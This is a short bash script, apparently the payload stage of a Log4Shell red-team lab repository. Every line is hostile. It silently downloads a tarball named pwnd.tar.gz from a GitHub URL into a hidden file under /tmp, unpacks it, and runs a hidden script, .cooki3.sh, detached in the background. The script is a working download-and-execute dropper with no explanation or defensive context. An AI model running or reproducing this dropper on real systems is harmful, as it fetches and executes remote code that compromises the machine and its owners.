#!/bin/bash
#----------
wget -q -O /tmp/.a https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/payload/pwnd.tar.gz & wait
tar -xf /tmp/.a -C /tmp/ & wait
bash /tmp/.cooki3.sh -r & disown